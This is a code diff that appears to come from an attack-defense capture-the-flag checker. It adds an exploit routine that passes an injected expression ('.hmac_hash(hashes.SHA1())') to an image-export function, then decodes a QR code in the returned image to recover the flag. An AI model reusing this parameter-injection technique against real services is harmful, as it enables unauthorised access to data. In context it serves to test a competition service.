@@ -153,10 +153,21 @@ async def exploit_export(
     address = "http://" + task.address + ":" + str(SERVICE_PORT) + "/"
     m = InteractionManager(address, logger)
     await m.register()
-    imgs = await m.get_profile_image_urls(email)
-    if not imgs:
+    urls = await m.get_profile_image_urls(email)
+    if not urls:
         raise MumbleException("No images found")
-    logger.info(f"Downloaded {len(imgs)} images")
+    logger.info(f"Got {len(urls)} images")
+    img_url = urls[0]
+    try:
+        img = await m.export_image_url(img_url, ".hmac_hash(hashes.SHA1())")
+    except:
+        raise MumbleException("Error exporting image")
+    if not img:
+        logger.error("Image not exported")
+        raise MumbleException("No images found")
+    flag = qr_codes.read_qr_code(img)
+    logger.info(f"Decoded image: {flag}")
+    return flag
 
 
 if __name__ == "__main__":
